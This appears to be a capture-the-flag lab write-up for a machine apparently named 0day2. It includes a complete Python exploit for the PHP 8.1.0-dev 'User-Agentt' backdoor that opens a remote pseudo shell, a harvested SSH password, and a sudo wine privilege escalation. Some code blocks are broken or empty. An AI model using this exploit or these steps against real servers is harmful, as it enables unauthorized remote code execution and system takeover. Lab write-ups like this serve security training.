# üîç Reconnaisance & Scanning

First, let‚Äôs start by enumerating the services running on the target server by using Nmap. For this, I used the command below, but you can use your preferences for this:
```

# üïµüèª‚Äç‚ôÇÔ∏è Vulnerability Assessment

We accessed the webpage on port <code>8080</code> through an HTTP proxy and saw a page showing ‚ÄúZerodium‚Äù. The web server running on <code>PHP version 8.1.0-dev</code> with <code>Apache</code> on port <code>80</code>. This suggests a development or testing environment, and the ‚ÄúZerodium‚Äù message might be a sign of a known vulnerability.

We used <code>searchsploit</code> to look for known vulnerabilities by searching with the keyword <code>PHP 8.1.0-dev</code>. From the results, we found a vulnerability which is <code>PHP 8.1.0-dev - ‚ÄòUser-Agentt‚Äô Remote Code Execution</code>. This means we can potentially exploit this version of PHP by sending a specially crafted request with a ‚ÄòUser-Agentt‚Äô header to execute code remotely on the server.
```

.

.
```

This PoC exploits a hidden backdoor in <code>PHP 8.1.0-dev</code>, specifically through the use of a fake HTTP header called ‚ÄòUser-Agentt‚Äô. In this vulnerable version, the backdoor allows remote code execution when a request includes the User-Agentt header containing a call to the function <code>zerodiumsystem()</code>. The exploit leverages this by sending system commands through that header, which the server then executes, giving the attacker remote control over the system.

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.
"""

#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
```

# üëæ Exploitation

We ran the script and connected to the target at http://&lt;TARGET-IP&gt;:8080/. The script successfully opened an interactive pseudo shell by abusing the **User-Agentt header backdoor** in <code>PHP 8.1.0-dev</code>. After gaining access, we confirmed we had root privileges by running <code>whoami</code>. We then listed the contents of the <code>/root</code> directory and found a <code>.bash_history</code> file, which contained a saved SSH command with credentials, username <code>liam</code> and password <code>L14mD0ck3Rp0w4</code>. This indicates the target is compromised, and we now have a **potential SSH credential**. 

We used the credentials found earlier to **SSH into the target machine** as the user <code>liam</code> at <TARGET-IP>. After confirming the host‚Äôs authenticity and providing the password, we successfully gained access to the system. Once logged in, we navigated to Liam‚Äôs home directory and read all files using <code>cat *</code>, revealing the user flag.

# üíÄ Privilege Escalation

Moving on to escalate our privileges to root. We need to find what we can leverage to spawn a privilege shell.

First, we need to try checking the sudo permissions available for the user:
```
$ sudo -l
.
.
.
User liam may run the following commands on 0day2:
    (root) NOPASSWD: /usr/bin/wine
```

So, what is **Wine** actually?

Wine is a software which we are able to run Windows applications in Linux. Therefore, to get to root privilege, we can use wine to open a root <code>cmd</code> by running the command:
```
$ sudo /usr/bin/wine cmd
```

We will able to run <code>cmd</code> as the root user. Retrieve the root flag.
